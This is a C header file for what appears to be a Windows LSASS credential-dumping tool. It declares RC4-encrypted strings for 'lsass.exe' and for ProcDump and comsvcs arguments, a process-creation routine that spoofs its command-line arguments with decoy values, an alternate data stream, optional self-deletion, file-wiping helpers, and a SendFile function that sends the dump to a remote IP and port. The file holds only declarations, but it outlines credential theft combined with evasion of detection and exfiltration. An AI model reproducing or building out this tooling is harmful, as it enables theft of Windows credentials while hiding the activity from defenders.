#pragma once

#ifndef COMMON_H
#define COMMON_H
#pragma warning (disable:4996)

#include <Windows.h>
#include "Structs.h"

// uncomment to enable self deletion
//#define SELF_DELETION

#define RC4KEYSIZE	64

// the new data stream name
#define NEW_STREAM L":ALT"

extern unsigned char rc4Key[32];
extern unsigned char lsassExeStr[20];
extern unsigned char parentProcessStr[26];
extern unsigned char procDumpArgs[16];
extern unsigned char dummyProcDumpArgs[216];
extern unsigned char comsvcsArgs[148];
extern unsigned char dummyComsvcsArgs[286];

typedef struct ParsedArgs {
	CHAR*	procDumpPath;
	CHAR*	localDmpPath;
	CHAR*	tempDmpPath;
	CHAR*	remotePath;
	BOOL    localMode;
	BOOL	verboseMode;
	BOOL	procDumpMode;
} ParsedArgs;

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);

ParsedArgs ParseArgs(int argc, char* argv[]);
WCHAR* ConvertToWideString(const char* asciiStr, size_t length);

BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pData, IN DWORD dwRc4KeySize, IN DWORD sDataSize);
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize);
VOID GenerateFileName(char* str, int length);

BOOL CreateArgSpoofProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, IN DWORD sProcDumpPathSize, IN BOOL verboseMode, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);

WriteToFile(const unsigned char* data, size_t dataSize, const char* filePath);
BOOL ZeroOutBytes(const char* filePath, size_t numberOfBytes);
BOOL FileExistsAndDelete(const char* filePath);
BOOL ReadFromFile(const char* FileInput, unsigned char** pFileData, PDWORD sFileSIze);
BOOL SendFile(const char* serverIp, int serverPort, const unsigned char* pData, DWORD dwDumpSize);
BOOL ParseIPAndPort(const char* address, char* ip, int* port);

#endif // COMMON_H